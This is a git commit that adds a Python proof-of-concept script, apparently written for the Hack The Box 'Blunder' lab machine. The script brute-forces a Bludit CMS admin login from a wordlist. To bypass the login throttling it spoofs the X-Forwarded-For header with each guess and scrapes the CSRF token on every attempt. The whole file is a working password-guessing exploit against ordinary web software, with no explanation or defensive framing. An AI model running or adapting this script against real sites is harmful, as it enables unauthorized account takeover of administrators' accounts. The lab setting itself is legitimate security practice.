9b7ba69d68da8f0b43ff1f211e66d1ea3ddc2c71
Rodrigo Bisso <rodrigobissomachado@gmail.com>
2020-06-05 13:17:58 -0300

    adding a lot o things...

---
+++ blunder-htb/poc.py
@@ -0,0 +1,47 @@
+#!/usr/bin/env python3
+import re
+import requests
+
+host = 'http://10.10.10.191'
+login_url = host + '/admin/login'
+username = 'fergus'
+wordlist = []
+
+# Generate 50 incorrect passwords
+with open('words2.txt', 'r') as f:
+    for line in f:
+        wordlist.append('{i}'.format(i = line.replace('\n','')))
+
+# Add the correct password to the end of the list
+#wordlist.append('adminadmin')
+
+for password in wordlist:
+    session = requests.Session()
+    login_page = session.get(login_url)
+    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
+
+    print('[*] Trying: {p}'.format(p = password))
+
+    headers = {
+        'X-Forwarded-For': password,
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+        'Referer': login_url
+    }
+
+    data = {
+        'tokenCSRF': csrf_token,
+        'username': username,
+        'password': password,
+        'save': ''
+    }
+
+    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
+
+    if 'location' in login_result.headers:
+        if '/admin/dashboard' in login_result.headers['location']:
+            print()
+            print('SUCCESS: Password found!')
+            print('Use {u}:{p} to login.'.format(u = username, p = password))
+            print()
+            break
+
